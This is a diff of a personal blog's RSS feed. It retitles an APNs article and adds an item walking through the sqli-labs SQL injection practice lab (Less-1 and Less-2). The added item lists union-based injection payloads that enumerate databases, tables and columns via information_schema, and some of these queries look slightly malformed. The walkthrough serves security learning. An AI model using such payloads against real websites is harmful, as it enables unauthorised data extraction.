@@ -31,11 +31,11 @@ Nmap scan report for 192.168.106.150Host is up (0.00044s latency).Not shown: 9
     </item>
     
     <item>
-      <title>APNs推送机制</title>
-      <link>https://oopsdc.tk/post/%E6%B5%85%E6%9E%90ios-apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</link>
+      <title>浅析APNs推送机制</title>
+      <link>https://oopsdc.tk/post/%E6%B5%85%E6%9E%90apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</link>
       <pubDate>Tue, 20 Jul 2021 17:19:55 +0800</pubDate>
       
-      <guid>https://oopsdc.tk/post/%E6%B5%85%E6%9E%90ios-apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</guid>
+      <guid>https://oopsdc.tk/post/%E6%B5%85%E6%9E%90apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</guid>
       <description>APNs简述 Apple Push Notification server(APNs)，即苹果推送通知服务。
 APNs出现需求 由于移动设备内存、CPU、电池容量等各种因素，iOS不允许APP进程常驻后台(时限大概为10min)。
 当用户主动关闭APP或后台APP进入后台达到限定时长后，意味着该APP进程的结束，在一定程度上保证了手机的流畅度与使用时长。但这也同时意味着服务器无法主动和用户交互(如实时推送消息)，为了解决这个限制，苹果推出了APNs，允许设备和服务器分别与苹果的推送服务器保持长连接状态。
@@ -87,6 +87,29 @@ route add default gw 10.7.150.1再使用route命令验证一下，确认配好�
 在文件中添加插件 官方文档:utterances
 修改footer.html文件，以PaperMod主题为例:
 &amp;lt;footer class=&amp;#34;footer&amp;#34;&amp;gt; {{- if .Site.Copyright }} &amp;lt;span&amp;gt;{{ .Site.Copyright | markdownify }}&amp;lt;/span&amp;gt; {{- else }} &amp;lt;span&amp;gt;&amp;amp;copy; {{ now.Year }} &amp;lt;a href=&amp;#34;{{ &amp;#34;&amp;#34; | absLangURL }}&amp;#34;&amp;gt;{{ .Site.Title }}&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; {{- end }} &amp;lt;span&amp;gt;&amp;amp;middot;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;Powered by &amp;lt;a href=&amp;#34;https://gohugo.io/&amp;#34; rel=&amp;#34;noopener noreferrer&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;Hugo&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;&amp;amp;middot;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;Theme &amp;lt;a href=&amp;#34;https://git.io/hugopapermod&amp;#34; rel=&amp;#34;noopener&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;PaperMod&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;script src=&amp;#34;https://utteranc.es/client.js&amp;#34; repo=&amp;#34;oopsdc/utterances&amp;#34; issue-term=&amp;#34;title&amp;#34; theme=&amp;#34;github-light&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34; async&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;/footer&amp;gt; 运行命令hugo server进入一篇文章即可查看评论插件效果。</description>
+    </item>
+    
+    <item>
+      <title>sqli-labs</title>
+      <link>https://oopsdc.tk/post/sqli-labs/</link>
+      <pubDate>Sat, 10 Jul 2021 00:00:00 +0800</pubDate>
+      
+      <guid>https://oopsdc.tk/post/sqli-labs/</guid>
+      <description>Less-1 传入id=1，页面正常回显，传入id=1&#39;页面报错。分别传参id=1&#39; and 1=1和id=1&#39; and 1=2，页面回显正常，判断为字符型注入。
+接下来使用联合查询看看有几列数据:id=-1&#39;union select 1,2,3--+，这是两条语句，先让前面为-1为假，执行后面的联合查询语句，测试有几列数据，测试出来有3列数据，其中第2、3位为显示位，可进行联合查询注入。
+查看当前数据库名:id=-1&#39;union select 1,database(),3--+
+爆库名:id=-1&#39;union select 1,database(),group_concat(schema_name) from information_schema.schemata
+爆表名:id=-1&#39;union select 1,database(),group_concat(table_name) from information_schema.tables where table_name=database()
+爆字段:id=-1&#39;union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=database()
+Less-2 传入id=1 and 1=1页面正常，id=1 and 1=2页面无回显，判断为数字型注入。
+使用id=-1 order by语句测试有几列数据，当id=-1 order by 4时页面报错，所以有3列数据。
+使用联合查询语句id=-1 union select 1,2,3判断是否有回显位，2、3为回显位。
+查看当前数据库名:id=-1 union select 1,database(),3
+爆库名:id=-1 union select 1,database(),group_concat(schema_name) from information_schema.schemata
+后续操作跟前一关一样。
+ 本文链接:sqli-labs | Atmet (oopsdc.tk)
+文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
+ </description>
     </item>
     
     <item>
